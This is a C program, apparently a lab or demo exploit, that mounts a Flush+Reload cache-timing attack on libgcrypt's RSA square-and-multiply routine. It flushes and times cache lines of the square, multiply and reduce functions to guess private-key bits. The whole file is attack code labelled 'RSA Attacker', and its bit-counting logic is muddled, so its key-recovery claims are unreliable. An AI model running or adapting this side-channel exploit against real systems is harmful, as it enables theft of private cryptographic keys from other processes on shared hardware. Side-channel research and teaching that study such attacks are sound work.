#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <dlfcn.h>

#define CACHE_LINE_SIZE 64
#define NUM_MONITORED_FUNCTIONS 3
#define MEASUREMENT_CYCLES 10000
#define THRESHOLD 200
#define OBSERVATION_WINDOW_US 100

volatile int running = 1;

typedef struct {
    void* address;
    char name[32];
    int hit_count;
    uint64_t *timing_history;
} monitored_function_t;

void signal_handler(int sig) {
    running = 0;
}

static inline uint64_t rdtsc() {
    uint32_t low, high;
    asm volatile ("rdtsc" : "=a" (low), "=d" (high));
    return ((uint64_t)high << 32) | low;
}

static inline void flush_cache_line(void* addr) {
    asm volatile ("clflush (%0)" : : "r" (addr) : "memory");
}

static inline void memory_barrier() {
    asm volatile ("mfence" : : : "memory");
}

uint64_t time_memory_access(void* addr) {
    uint64_t start, end;
    volatile char dummy;

    memory_barrier();
    start = rdtsc();
    dummy = *(volatile char*)addr;
    end = rdtsc();
    memory_barrier();

    return end - start;
}

void analyze_bit_pattern(monitored_function_t *funcs, int measurement_idx) {
    static int last_analysis = 0;

    if (measurement_idx - last_analysis >= 100) {
        printf("RSA Attacker: Analyzing execution pattern (measurement %d):\n", measurement_idx);

        int square_hits = funcs[0].hit_count - (last_analysis > 0 ? funcs[0].hit_count - 100 : 0);
        int multiply_hits = funcs[1].hit_count - (last_analysis > 0 ? funcs[1].hit_count - 100 : 0);
        int reduce_hits = funcs[2].hit_count - (last_analysis > 0 ? funcs[2].hit_count - 100 : 0);

        printf("  Square operations:   %3d hits (always present)\n", square_hits);
        printf("  Multiply operations: %3d hits (indicates bit = 1)\n", multiply_hits);
        printf("  Reduce operations:   %3d hits (modular reduction)\n", reduce_hits);

        // Simplified bit analysis
        if (multiply_hits > 50) {
            printf("  -> Detected: Private key bit likely = 1 (Square-Reduce-Multiply-Reduce)\n");
        } else {
            printf("  -> Detected: Private key bit likely = 0 (Square-Reduce only)\n");
        }

        last_analysis = measurement_idx;
    }
}

int main(int argc, char* argv[]) {
    void* lib_handle;
    monitored_function_t funcs[NUM_MONITORED_FUNCTIONS];
    int total_measurements = 0;

    printf("RSA Attacker process starting (PID: %d)\n", getpid());
    printf("RSA Attacker: Targeting RSA square-and-multiply implementation\n");

    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

    lib_handle = dlopen("./lib/libgcrypt.so.11.6.0", RTLD_NOW);
    if (!lib_handle) {
        fprintf(stderr, "Failed to load libgcrypt: %s\n", dlerror());
        return 1;
    }

    // Target the key functions in square-and-multiply exponentiation
    void* powm_func = dlsym(lib_handle, "gcry_mpi_powm");
    void* sqr_func = dlsym(lib_handle, "_gcry_mpih_sqr_n_basecase");  // Square operation
    void* mul_func = dlsym(lib_handle, "_gcry_mpih_mul");             // Multiply operation

    if (!powm_func) {
        fprintf(stderr, "Failed to find gcry_mpi_powm function\n");
        dlclose(lib_handle);
        return 1;
    }

    // Initialize monitoring structures
    funcs[0].address = sqr_func ? sqr_func : (char*)powm_func + 0x100;
    strcpy(funcs[0].name, "Square");
    funcs[0].hit_count = 0;
    funcs[0].timing_history = malloc(MEASUREMENT_CYCLES * sizeof(uint64_t));

    funcs[1].address = mul_func ? mul_func : (char*)powm_func + 0x200;
    strcpy(funcs[1].name, "Multiply");
    funcs[1].hit_count = 0;
    funcs[1].timing_history = malloc(MEASUREMENT_CYCLES * sizeof(uint64_t));

    funcs[2].address = (char*)powm_func + 0x300; // Reduction is part of powm
    strcpy(funcs[2].name, "Reduce");
    funcs[2].hit_count = 0;
    funcs[2].timing_history = malloc(MEASUREMENT_CYCLES * sizeof(uint64_t));

    printf("RSA Attacker: Monitoring functions:\n");
    for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
        printf("  %s: %p\n", funcs[i].name, funcs[i].address);
    }

    printf("RSA Attacker: Starting RSA key bit recovery attack...\n");
    printf("RSA Attacker: Monitoring square/multiply pattern to recover private key bits\n");
    printf("RSA Attacker: Press Ctrl+C to stop and show results\n");

    while (running && total_measurements < MEASUREMENT_CYCLES) {
        // Flush all monitored functions
        for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
            flush_cache_line(funcs[i].address);
        }

        // Wait for victim to execute RSA operations
        usleep(OBSERVATION_WINDOW_US);

        // Measure access times
        for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
            uint64_t access_time = time_memory_access(funcs[i].address);
            funcs[i].timing_history[total_measurements] = access_time;

            if (access_time < THRESHOLD) {
                funcs[i].hit_count++;
            }
        }

        total_measurements++;

        // Analyze pattern every 100 measurements
        analyze_bit_pattern(funcs, total_measurements);

        if (total_measurements % 1000 == 0) {
            printf("RSA Attacker: Completed %d measurements\n", total_measurements);
        }
    }

    printf("\n=== RSA KEY RECOVERY ATTACK RESULTS ===\n");
    printf("Total measurements: %d\n", total_measurements);
    printf("\nFunction access patterns:\n");

    for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
        double hit_rate = (double)funcs[i].hit_count / total_measurements * 100;
        printf("%-10s (addr %p): %6d hits (%.2f%%)",
               funcs[i].name, funcs[i].address, funcs[i].hit_count, hit_rate);

        if (hit_rate > 10.0) {
            printf(" <- ACTIVE");
        }
        printf("\n");
    }

    printf("\n=== ATTACK ANALYSIS ===\n");
    printf("RSA Square-and-Multiply Pattern Analysis:\n");
    printf("• Square operations: Always present (hit rate should be high)\n");
    printf("• Multiply operations: Present when private key bit = 1\n");
    printf("• Reduce operations: Present after each square/multiply\n");
    printf("\nPrivate Key Bit Recovery:\n");

    double square_rate = (double)funcs[0].hit_count / total_measurements * 100;
    double multiply_rate = (double)funcs[1].hit_count / total_measurements * 100;
    double reduce_rate = (double)funcs[2].hit_count / total_measurements * 100;

    if (square_rate > 50.0) {
        printf("✓ RSA operations detected (square operations: %.1f%%)\n", square_rate);
        if (multiply_rate > 30.0) {
            printf("✓ High multiply activity (%.1f%%) suggests many '1' bits in private key\n", multiply_rate);
        } else {
            printf("• Lower multiply activity (%.1f%%) suggests fewer '1' bits\n", multiply_rate);
        }

        printf("\nKey Recovery Status:\n");
        printf("• To fully recover the key, extend timing analysis\n");
        printf("• Correlate timing patterns with bit positions\n");
        printf("• Apply statistical analysis to distinguish bit patterns\n");
    } else {
        printf("⚠ Low RSA activity detected - victim may not be performing RSA operations\n");
    }

    // Cleanup
    for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
        free(funcs[i].timing_history);
    }

    dlclose(lib_handle);
    return 0;
}